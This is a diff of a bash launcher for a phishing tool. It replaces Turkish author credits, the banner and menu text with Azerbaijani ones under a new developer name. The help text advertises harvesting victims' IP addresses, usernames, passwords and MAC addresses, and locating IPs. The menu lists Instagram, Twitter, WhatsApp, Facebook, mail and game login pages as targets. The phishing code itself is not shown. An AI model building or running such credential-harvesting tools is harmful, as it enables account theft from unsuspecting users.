@@ -1,33 +1,32 @@
 #!/bin/bash
 #!/bin/sh
-#Code:Yaman Efkar
-#Türk Siber Timi
-#İnstagram : @turksibertimi
-#Youtube : YamanEfkar
+#Developer:Nihat 「 FARZ 」
+#İnstagram : @NihatFarz
+#Telegram : NihatFarz
 clear
 case $1 in
 
       "--help")
 	   sleep 1
        echo -e "
---help & --h   (Yardım Menüsünü Çağırır)
---ıp & --ip    (Giriş Yapmış Kişilerin Ip Adresini Listeler)
---user         (Giriş Yapılmış Username & Pass)
---mac          (Giriş Yapanların Mac Adresleri)
---location     (Belirtilen Ip Adresinin Yer Tespiti)
-bash yaman.sh & sh yaman.sh (Phishing Toolu 'nu Çalıştırır)
+--help & --h   (Kömək Menyusu)
+--ıp & --ip    (Giriş Etmiş İstifadəçilərin Ip Adresini Göstərər)
+--user         (Giriş Etmiş Username & Pass)
+--mac          (Giriş Etmiş Mac Adresləri)
+--location     (Seçilən Ip Adresinin Yerinin Tapılması)
+bash farz.sh & sh farz.sh (Phishing Toolu 'nu İşə Salar)
    "
   ;;
 
      "--h")
 	   sleep 1
        echo -e "
---help & --h   (Yardım Menüsünü Çağırır)
---ıp & --ip    (Giriş Yapmış Kişilerin Ip Adresini Listeler)
---user         (Giriş Yapılmış Username & Pass)
---mac          (Giriş Yapanların Mac Adresleri)
---location     (Belirtilen Ip Adresinin Yer Tespiti)
-bash yaman.sh & sh yaman.sh (Phishing Toolu 'nu Çalıştırır)"
+--help & --h   (Kömək Menyusu)
+--ıp & --ip    (Giriş Etmiş İstifadəçilərin Ip Adresini Göstərər)
+--user         (Giriş Etmiş Username & Pass)
+--mac          (Giriş Etmiş Mac Adresləri)
+--location     (Seçilən Ip Adresinin Yerinin Tapılması)
+bash farz.sh & sh farz.sh (Phishing Toolu 'nu İşə Salar)"
 
   ;;
 
@@ -35,50 +34,29 @@ esac
 
 banner(){
 echo -e '\033[31;40;1m 
-	────────────────█████████───────────────
-	──────────────█████████████─────────────
-	───────────███████████████████──────────
-	────────────────────────────────────────
-	────────████████████████████████────────
-	────────████████████████████████────────
-	────────────────────────────────────────
-	█████████─████████████████████─█████████
-	█████████─████████████████████─█████████
-	███───────████████────████████───────███
-	███───────██████───██───██████───────███
-	─███──────█████──████────█████──────███─
-	──███─────████─────██─────████─────███──
-	───███────████─────██─────████────███───
-	────███───█████────██────█████───███────
-	─────███──█████────██────█████──███─────
-	──────███─███████──────███████─███──────
-	───────██─████████████████████─██───────
-	────────█─████████████████████─█────────
-	────────────────────────────────────────
-	──────────████████████████████──────────
-	───────────██████████████████───────────
-	─────────────██████████████─────────────
-	───────────────███████████──────────────
-	────────────────────────────────────────
-	────────────────█████████───────────────
-	──────────────█████████████─────────────
+	███████╗ █████╗ ██████╗ ███████╗
+        ██╔════╝██╔══██╗██╔══██╗╚══███╔╝
+        █████╗  ███████║██████╔╝  ███╔╝ 
+        ██╔══╝  ██╔══██║██╔══██╗ ███╔╝  
+        ██║     ██║  ██║██║  ██║███████╗
+        ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝          
 
-	   \e[35m☾★ ☾★ ☾★ ☾★ YamanEfkar ☾★ ☾★ ☾★ ☾★	
-	 \e[31m☾★ ☾★ ☾★ ☾★ Türk Siber Timi ☾★ ☾★ ☾★ ☾★	
-  \e[32m☾★ ☾★ ☾★ ☾★ İnstagram : @turksibertimi ☾★ ☾★ ☾★ ☾★	
+	   \e[32mNihat 「 FARZ 」	
+	 \e[32mTelegram @NihatFarz	
+  \e[31mTool Özəl Olaraq MaragliWeb Kanalı Üçün Yazılmışdır.	
 '
 echo -e '
 \e[31m[01]\e[32mİnstagram			\e[31m[04]\e[32mFacebook
-\e[31m[02]\e[32mTwitter			\e[31m[05]\e[32mMail
+\e[31m[02]\e[32mTwitter			        \e[31m[05]\e[32mMail
 \e[31m[03]\e[32mWhatsapp			\e[31m[06]\e[32mGame (Oyunlar)
 
 \e[31m[00] Code
 
-\e[31m[99] Çıkış
+\e[31m[99] Çıxış
 
 
 '
-read -p  "İşlem Numarası:" islem
+read -p  "Seçim Edin:" islem
 }
 
 
@@ -127,7 +105,7 @@ elif [[ $islem == 00 ]]; then
 elif [[ $islem == 99 ]]; then
 	exit 1
 else
-	echo -e '\033[36;40;1m Girdiğniz İşlem Numarasını Kontrol Ediniz....'	
+	echo -e '\033[36;40;1m Xəta.Qeyd Etdiyiniz Seçimi düzgün edin....'	
 	sleep 1
 	clear 
 	banner
